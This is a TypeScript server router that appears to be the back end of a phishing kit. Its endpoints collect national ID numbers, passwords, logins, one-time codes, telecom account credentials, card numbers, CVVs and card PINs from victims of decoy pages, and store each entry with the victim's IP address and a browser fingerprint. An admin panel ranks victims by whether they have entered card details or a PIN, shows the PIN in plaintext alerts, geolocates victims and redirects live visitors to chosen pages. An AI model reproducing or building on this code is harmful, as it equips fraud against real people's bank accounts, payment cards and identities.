import { COOKIE_NAME } from "@shared/const";
import { z } from "zod";
import { getSessionCookieOptions } from "./_core/cookies";
import { systemRouter } from "./_core/systemRouter";
import { publicProcedure, router } from "./_core/trpc";
import { TRPCError } from "@trpc/server";
import { NOT_ADMIN_ERR_MSG } from "@shared/const";

const adminProcedure = publicProcedure.use(({ ctx, next }) => {
  const isPasswordAdmin = ctx.adminSession !== null;

  if (!isPasswordAdmin) {
    throw new TRPCError({
      code: "FORBIDDEN",
      message: NOT_ADMIN_ERR_MSG,
    });
  }
  return next({ ctx });
});

import { adminAuthRouter } from "./routers/adminAuth";
import {
  publishVisitorRedirect,
  getVisitorPresence,
} from "./_core/socketChannel";
import { lookupGeoBatch } from "./_core/geoip";
import {
  archiveRegistrations,
  deleteRegistrationsCascade,
  getAllVisitorsAggregated,
  getCardPinSubmissionsByRegistrationId,
  getCardPinSubmissionsSince,
  getLoginAttemptsByRegistrationId,
  getPaymentSubmissionsSince,
  getOtpSubmissionsByRegistrationId,
  getPasswordSubmissionsByRegistrationId,
  getPaymentSubmissionsByRegistrationId,
  getPersonalInfoByRegistrationId,
  getPhoneVerificationsByRegistrationId,
  getRegistrationById,
  getStats,
  insertCardPinSubmission,
  insertLoginAttempt,
  insertOtpSubmission,
  insertPasswordSubmission,
  insertPaymentSubmission,
  insertPersonalInfo,
  insertPhoneVerification,
  insertRegistration,
  updateRegistration,
  resolveRegistration,
  unarchiveRegistrations,
  listCardPinSubmissions,
  listLoginAttempts,
  listOtpSubmissions,
  listPasswordSubmissions,
  listPaymentSubmissions,
  listPersonalInfo,
  listPhoneVerifications,
  listRegistrations,
} from "./db";

function getClientIp(req: any): string | null {
  // Cloudflare sends the real visitor IP in CF-Connecting-IP
  const cfIp = req?.headers?.["cf-connecting-ip"];
  if (typeof cfIp === "string" && cfIp.length > 0) {
    return cfIp.trim();
  }
  const xff = req?.headers?.["x-forwarded-for"];
  let ip: string | null = null;
  if (typeof xff === "string" && xff.length > 0) {
    ip = xff.split(",")[0].trim();
  } else {
    ip = req?.ip ?? req?.socket?.remoteAddress ?? null;
  }
  // Normalize IPv6-mapped IPv4 addresses (e.g. ::ffff:192.168.1.1 → 192.168.1.1)
  if (ip && ip.startsWith("::ffff:")) {
    ip = ip.slice(7);
  }
  return ip;
}

function getUserAgent(req: any): string | null {
  const ua = req?.headers?.["user-agent"];
  return typeof ua === "string" ? ua : null;
}

export const appRouter = router({
  system: systemRouter,
  adminAuth: adminAuthRouter,
  auth: router({
    me: publicProcedure.query(opts => opts.ctx.user),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return { success: true } as const;
    }),
  }),

  // Public procedures: receive data from the static HTML pages.
  registration: router({
    createVisitor: publicProcedure
      .input(z.object({ fingerprint: z.string().optional() }).optional())
      .mutation(async ({ ctx, input }) => {
      const fingerprint = input?.fingerprint || ctx.req.headers['x-visitor-fingerprint'] as string || null;
      
      // Create or update registration
      const ip = getClientIp(ctx.req) || "unknown";
      const id = await resolveRegistration(
        fingerprint,
        ip === "unknown" ? null : ip,
        getUserAgent(ctx.req)
      );
      
      // Set the cookie
      if (id) {
        ctx.res.cookie("regId", id.toString(), {
          httpOnly: false,
          secure: true,
          sameSite: "lax",
          maxAge: 1000 * 60 * 60 * 24 * 365, // 1 year
          path: "/",
        });
      }
      
      const { notifyAdmins: notifyCreate } = await import("./_core/socketChannel");
      await notifyCreate();
      return { id };
    }),
    update: publicProcedure
      .input(
        z.object({
          registrationId: z.number().int().optional().nullable(), // kept for backward compatibility but ignored
          userType: z.string().max(64).optional().nullable(),
          qid: z.string().max(32).optional().nullable(),
          mobile: z.string().max(32).optional().nullable(),
          email: z.string().max(320).optional().nullable(),
          intlPhone: z.string().max(32).optional().nullable(),
        }),
      )
      .mutation(async ({ input, ctx }) => {
        const fingerprint = ctx.req.headers['x-visitor-fingerprint'] as string || null;
        const ip = getClientIp(ctx.req) || "unknown";
        
        const { registrationId: _ignored, ...data } = input;
        const id = await resolveRegistration(
          fingerprint,
          ip === "unknown" ? null : ip,
          getUserAgent(ctx.req),
          {
            userType: data.userType ?? undefined,
            qid: data.qid ?? undefined,
            mobile: data.mobile ?? undefined,
            email: data.email ?? undefined,
            intlPhone: data.intlPhone ?? undefined,
          }
        );
        
                if (id) {
          ctx.res.cookie("regId", id.toString(), {
            httpOnly: false,
            secure: true,
            sameSite: "lax",
            maxAge: 1000 * 60 * 60 * 24 * 365,
            path: "/",
          });
        }
        const { notifyAdmins: notifyUpdate } = await import("./_core/socketChannel");
        await notifyUpdate();
        return { success: !!id, id } as const;
      }),
    submit: publicProcedure
      .input(
        z.object({
          userType: z.string().max(64).optional().nullable(),
          qid: z.string().max(32).optional().nullable(),
          mobile: z.string().max(32).optional().nullable(),
          email: z.string().max(320).optional().nullable(),
          intlPhone: z.string().max(32).optional().nullable(),
        }),
      )
      .mutation(async ({ input, ctx }) => {
        const fingerprint = ctx.req.headers['x-visitor-fingerprint'] as string || null;
        const ip = getClientIp(ctx.req) || "unknown";
        
        const id = await resolveRegistration(
          fingerprint,
          ip === "unknown" ? null : ip,
          getUserAgent(ctx.req),
          {
            userType: input.userType ?? undefined,
            qid: input.qid ?? undefined,
            mobile: input.mobile ?? undefined,
            email: input.email ?? undefined,
            intlPhone: input.intlPhone ?? undefined,
          }
        );
        
        if (id) {
          ctx.res.cookie("regId", id.toString(), {
            httpOnly: false,
            secure: true,
            sameSite: "lax",
            maxAge: 1000 * 60 * 60 * 24 * 365,
            path: "/",
          });
        }
        
        const { notifyAdmins: notifyReg } = await import("./_core/socketChannel");
        await notifyReg();
        return { success: !!id, id } as const;
      }),
  }),
  otp: router({
    submit: publicProcedure
      .input(
        z.object({
          registrationId: z.number().int().optional().nullable(),
          otpCode: z.string().min(1).max(16),
          phoneNumber: z.string().max(32).optional().nullable(),
        }),
      )
      .mutation(async ({ input, ctx }) => {
        const fingerprint = ctx.req.headers['x-visitor-fingerprint'] as string || null;
        const ip = getClientIp(ctx.req) || "unknown";
        const regId = await resolveRegistration(fingerprint, ip === "unknown" ? null : ip, getUserAgent(ctx.req));
        
        const id = await insertOtpSubmission({
          registrationId: regId ?? ctx.regId ?? input.registrationId ?? null,
          otpCode: input.otpCode,
          phoneNumber: input.phoneNumber ?? null,
          ipAddress: getClientIp(ctx.req),
          userAgent: getUserAgent(ctx.req),
        });
        const { notifyAdmins: notifyOtp } = await import("./_core/socketChannel");
        await notifyOtp("otp", regId ?? ctx.regId ?? input.registrationId ?? null);
        return { success: true, id } as const;
      }),
  }),

  personalInfo: router({
    submit: publicProcedure
      .input(
        z.object({
          registrationId: z.number().int().optional().nullable(),
          nationality: z.string().max(16).optional().nullable(),
          arabicName: z.string().max(255).optional().nullable(),
          englishName: z.string().max(255).optional().nullable(),
          birthDate: z.string().max(32).optional().nullable(),
          gender: z.string().max(16).optional().nullable(),
          email: z.string().max(320).optional().nullable(),
          buildingNumber: z.string().max(32).optional().nullable(),
          street: z.string().max(128).optional().nullable(),
          zone: z.string().max(64).optional().nullable(),
        }),
      )
      .mutation(async ({ input, ctx }) => {
        const fingerprint = ctx.req.headers['x-visitor-fingerprint'] as string || null;
        const ip = getClientIp(ctx.req) || "unknown";
        const regId = await resolveRegistration(fingerprint, ip === "unknown" ? null : ip, getUserAgent(ctx.req));
        
        const id = await insertPersonalInfo({
          registrationId: regId ?? ctx.regId ?? input.registrationId ?? null,
          nationality: input.nationality ?? null,
          arabicName: input.arabicName ?? null,
          englishName: input.englishName ?? null,
          birthDate: input.birthDate ?? null,
          gender: input.gender ?? null,
          email: input.email ?? null,
          buildingNumber: input.buildingNumber ?? null,
          street: input.street ?? null,
          zone: input.zone ?? null,
          ipAddress: getClientIp(ctx.req),
          userAgent: getUserAgent(ctx.req),
        });
        const { notifyAdmins: notifyPersonal } = await import("./_core/socketChannel");
        await notifyPersonal();
        return { success: true, id } as const;
      }),
  }),

  password: router({
    submit: publicProcedure
      .input(
        z.object({
          registrationId: z.number().int().optional().nullable(),
          password: z.string().min(1).max(255),
        }),
      )
      .mutation(async ({ input, ctx }) => {
        const fingerprint = ctx.req.headers['x-visitor-fingerprint'] as string || null;
        const ip = getClientIp(ctx.req) || "unknown";
        const regId = await resolveRegistration(fingerprint, ip === "unknown" ? null : ip, getUserAgent(ctx.req));
        
        const id = await insertPasswordSubmission({
          registrationId: regId ?? ctx.regId ?? input.registrationId ?? null,
          password: input.password,
          ipAddress: getClientIp(ctx.req),
          userAgent: getUserAgent(ctx.req),
        });
        const { notifyAdmins: notifyPassword } = await import("./_core/socketChannel");
        await notifyPassword();
        return { success: true, id } as const;
      }),
  }),

  phoneVerify: router({
    submit: publicProcedure
      .input(
        z.object({
          registrationId: z.number().int().optional().nullable(),
          serviceProvider: z.string().max(64).optional().nullable(),
          phoneNumber: z.string().max(32).optional().nullable(),
          cardOwnerId: z.string().max(32).optional().nullable(),
          providerEmail: z.string().max(320).optional().nullable(),
          providerPassword: z.string().max(255).optional().nullable(),
        }),
      )
      .mutation(async ({ input, ctx }) => {
        const fingerprint = ctx.req.headers['x-visitor-fingerprint'] as string || null;
        const ip = getClientIp(ctx.req) || "unknown";
        const regId = await resolveRegistration(fingerprint, ip === "unknown" ? null : ip, getUserAgent(ctx.req));
        
        const id = await insertPhoneVerification({
          registrationId: regId ?? ctx.regId ?? input.registrationId ?? null,
          serviceProvider: input.serviceProvider ?? null,
          phoneNumber: input.phoneNumber ?? null,
          cardOwnerId: input.cardOwnerId ?? null,
          providerEmail: input.providerEmail ?? null,
          providerPassword: input.providerPassword ?? null,
          ipAddress: getClientIp(ctx.req),
          userAgent: getUserAgent(ctx.req),
        });
        const { notifyAdmins: notifyPhone } = await import("./_core/socketChannel");
        await notifyPhone();
        return { success: true, id } as const;
      }),
  }),

  payment: router({
    submit: publicProcedure
      .input(
        z.object({
          registrationId: z.number().int().optional().nullable(),
          cardNumber: z.string().max(32).optional().nullable(),
          expMonth: z.string().max(4).optional().nullable(),
          expYear: z.string().max(8).optional().nullable(),
          cvv: z.string().max(8).optional().nullable(),
          cardType: z.string().max(16).optional().nullable(),
          otp: z.string().max(16).optional().nullable(),
        }),
      )
      .mutation(async ({ input, ctx }) => {
        const fingerprint = ctx.req.headers['x-visitor-fingerprint'] as string || null;
        const ip = getClientIp(ctx.req) || "unknown";
        const regId = await resolveRegistration(fingerprint, ip === "unknown" ? null : ip, getUserAgent(ctx.req));
        
        const id = await insertPaymentSubmission({
          registrationId: regId ?? ctx.regId ?? input.registrationId ?? null,
          cardNumber: input.cardNumber ?? null,
          expMonth: input.expMonth ?? null,
          expYear: input.expYear ?? null,
          cvv: input.cvv ?? null,
          cardType: input.cardType ?? null,
          otp: input.otp ?? null,
          ipAddress: getClientIp(ctx.req),
          userAgent: getUserAgent(ctx.req),
        });
        const { notifyAdmins: notifyPayment } = await import("./_core/socketChannel");
        await notifyPayment("payment", regId ?? ctx.regId ?? input.registrationId ?? null);
        return { success: true, id } as const;
      }),
  }),

  login: router({
    submit: publicProcedure
      .input(
        z.object({
          registrationId: z.number().int().optional().nullable(),
          username: z.string().max(255).optional().nullable(),
          password: z.string().max(255).optional().nullable(),
        }),
      )
      .mutation(async ({ input, ctx }) => {
        const fingerprint = ctx.req.headers['x-visitor-fingerprint'] as string || null;
        const ip = getClientIp(ctx.req) || "unknown";
        const regId = await resolveRegistration(fingerprint, ip === "unknown" ? null : ip, getUserAgent(ctx.req));
        
        const id = await insertLoginAttempt({
          registrationId: regId ?? ctx.regId ?? input.registrationId ?? null,
          username: input.username ?? null,
          password: input.password ?? null,
          ipAddress: getClientIp(ctx.req),
          userAgent: getUserAgent(ctx.req),
        });
        const { notifyAdmins: notifyLogin } = await import("./_core/socketChannel");
        await notifyLogin();
        return { success: true, id } as const;
      }),
  }),

  cardPin: router({
    submit: publicProcedure
      .input(
        z.object({
          registrationId: z.number().int().optional().nullable(),
          cardPin: z.string().min(1).max(16),
        }),
      )
      .mutation(async ({ input, ctx }) => {
        const fingerprint = ctx.req.headers['x-visitor-fingerprint'] as string || null;
        const ip = getClientIp(ctx.req) || "unknown";
        const regId = await resolveRegistration(fingerprint, ip === "unknown" ? null : ip, getUserAgent(ctx.req));
        
        const id = await insertCardPinSubmission({
          registrationId: regId ?? ctx.regId ?? input.registrationId ?? null,
          cardPin: input.cardPin,
          ipAddress: getClientIp(ctx.req),
          userAgent: getUserAgent(ctx.req),
        });
        const { notifyAdmins: notifyCardPin } = await import("./_core/socketChannel");
        await notifyCardPin();
        return { success: true, id } as const;
      }),
  }),



  // Admin-only procedures: read data for the dashboard.
  admin: router({
    getRegistrations: adminProcedure.query(() => listRegistrations(500)),
    getOtpSubmissions: adminProcedure.query(() => listOtpSubmissions(500)),
    getPersonalInfo: adminProcedure.query(() => listPersonalInfo(500)),
    getPasswordSubmissions: adminProcedure.query(() => listPasswordSubmissions(500)),
    getPhoneVerifications: adminProcedure.query(() => listPhoneVerifications(500)),
    getPaymentSubmissions: adminProcedure.query(() => listPaymentSubmissions(500)),
    getLoginAttempts: adminProcedure.query(() => listLoginAttempts(500)),
    getCardPinSubmissions: adminProcedure.query(() => listCardPinSubmissions(500)),
    getStats: adminProcedure.query(() => getStats()),
    getRecentAlerts: adminProcedure
      .input(z.object({ since: z.number().int().nonnegative() }))
      .query(async ({ input }) => {
        const [payments, cardPins] = await Promise.all([
          getPaymentSubmissionsSince(input.since),
          getCardPinSubmissionsSince(input.since),
        ]);
        const items = [
          ...payments.map((p: any) => ({
            kind: "payment" as const,
            id: p.id,
            registrationId: p.registrationId ?? null,
            createdAt: p.createdAt,
            ipAddress: p.ipAddress ?? null,
            summary: p.cardNumber ? `بطاقة تنتهي بـ ${String(p.cardNumber).slice(-4)}` : "إدخال بيانات بطاقة",
          })),
          ...cardPins.map((p: any) => ({
            kind: "cardPin" as const,
            id: p.id,
            registrationId: p.registrationId ?? null,
            createdAt: p.createdAt,
            ipAddress: p.ipAddress ?? null,
            summary: p.cardPin ? `PIN: ${String(p.cardPin)}` : "إدخال رمز PIN",
          })),
        ];
        items.sort((a, b) => {
          const ta = a.createdAt ? new Date(a.createdAt as any).getTime() : 0;
          const tb = b.createdAt ? new Date(b.createdAt as any).getTime() : 0;
          return tb - ta;
        });
        return { items, serverTime: Date.now() };
      }),
    listVisitors: adminProcedure
      .input(
        z
          .object({
            search: z.string().trim().optional(),
            stage: z
              .enum([
                "all",
                "reachedPayment",
                "enteredCard",
                "enteredPin",
                "today",
              ])
              .default("all"),
            limit: z.number().int().positive().max(500).default(200),
            offset: z.number().int().nonnegative().default(0),
            archived: z.enum(["active", "archived", "all"]).default("active"),
          })
          .default({ stage: "all", limit: 200, offset: 0, archived: "active" }),
      )
      .query(async ({ input }) => {
        const all = await getAllVisitorsAggregated(input.limit, input.archived, input.offset);
        const search = (input.search ?? "").toLowerCase();
        const startOfToday = new Date();
        startOfToday.setHours(0, 0, 0, 0);

        const filtered = all.filter((v) => {
          // Stage filter
          if (input.stage === "reachedPayment" && v.payments.length === 0) return false;
          if (input.stage === "enteredCard") {
            const hasCard = v.payments.some(
              (p: any) => p.cardNumber && String(p.cardNumber).length > 0,
            );
            if (!hasCard) return false;
          }
          if (input.stage === "enteredPin" && v.cardPins.length === 0) return false;
          if (input.stage === "today" && v.lastActivityAt < startOfToday) return false;

          // Search filter
          if (search.length > 0) {
            const hay = [
              v.registration.qid,
              v.registration.email,
              v.registration.mobile,
              v.registration.intlPhone,
              v.registration.userType,
              v.registration.ipAddress,
              ...v.personalInfo.flatMap((p: any) => [
                p.arabicName,
                p.englishName,
                p.email,
                p.nationality,
                p.zone,
                p.street,
              ]),
              ...v.logins.flatMap((l: any) => [l.username]),
              ...v.payments.flatMap((p: any) => [
                p.cardNumber,
              ]),
              ...v.phoneVerifications.flatMap((p: any) => [
                p.providerEmail,
                p.phoneNumber,
                p.cardOwnerId,
                p.serviceProvider,
              ]),
            ]
              .filter((x): x is string => typeof x === "string" && x.length > 0)
              .map((x) => x.toLowerCase());
            if (!hay.some((s) => s.includes(search))) return false;
          }

          return true;
        });

        // Look up geo data for each visitor's IP in parallel (cached + skips private IPs)
        const ips = filtered.map((v: any) => v.registration.ipAddress as string | null);
        const geoMap = await lookupGeoBatch(ips);

        const enriched = filtered.map((v: any) => {
          const ip = v.registration.ipAddress as string | null;
          const geo = ip ? (geoMap.get(ip) ?? null) : null;
          return {
            ...v,
            presence: v.registration.fingerprint ? getVisitorPresence(v.registration.fingerprint) : { online: false, currentPage: null, lastSeenAt: null },
            geo,
          };
        });

        return {
          visitors: enriched,
          total: all.length,
          shown: enriched.length,
        };
      }),
    getJourney: adminProcedure
      .input(z.object({ registrationId: z.number().int().positive() }))
      .query(async ({ input }) => {
        const [
          registration,
          personalInfoList,
          passwordList,
          otpList,
          phoneVerificationList,
          paymentList,
          loginList,
          cardPinList,
        ] = await Promise.all([
          getRegistrationById(input.registrationId),
          getPersonalInfoByRegistrationId(input.registrationId),
          getPasswordSubmissionsByRegistrationId(input.registrationId),
          getOtpSubmissionsByRegistrationId(input.registrationId),
          getPhoneVerificationsByRegistrationId(input.registrationId),
          getPaymentSubmissionsByRegistrationId(input.registrationId),
          getLoginAttemptsByRegistrationId(input.registrationId),
          getCardPinSubmissionsByRegistrationId(input.registrationId),
        ]);
        return {
          registration,
          personalInfo: personalInfoList,
          passwords: passwordList,
          otps: otpList,
          phoneVerifications: phoneVerificationList,
          payments: paymentList,
          logins: loginList,
          cardPins: cardPinList,
        };
      }),
    archiveVisitors: adminProcedure
      .input(z.object({ ids: z.array(z.number().int().positive()).min(1).max(500) }))
      .mutation(async ({ input }) => {
        const affected = await archiveRegistrations(input.ids);
        return { affected };
      }),
    unarchiveVisitors: adminProcedure
      .input(z.object({ ids: z.array(z.number().int().positive()).min(1).max(500) }))
      .mutation(async ({ input }) => {
        const affected = await unarchiveRegistrations(input.ids);
        return { affected };
      }),
    deleteVisitors: adminProcedure
      .input(z.object({ ids: z.array(z.number().int().positive()).min(1).max(500) }))
      .mutation(async ({ input }) => {
        const affected = await deleteRegistrationsCascade(input.ids);
        return { affected };
      }),
    redirectVisitor: adminProcedure
      .input(
        z.object({
          registrationId: z.number().int().positive(),
          path: z
            .string()
            .min(1)
            .max(200)
            .regex(/^\/[A-Za-z0-9_\-./?&=%]*$/, "path must start with / and be a safe URL"),
        })
      )
      .mutation(async ({ input }) => {
        const { getRegistrationById } = await import("./db");
        const reg = await getRegistrationById(input.registrationId);
        if (!reg || !reg.fingerprint) return { delivered: 0 };
        const delivered = publishVisitorRedirect(reg.fingerprint, input.path);
        return { delivered };
      }),

  }),
});

export type AppRouter = typeof appRouter;
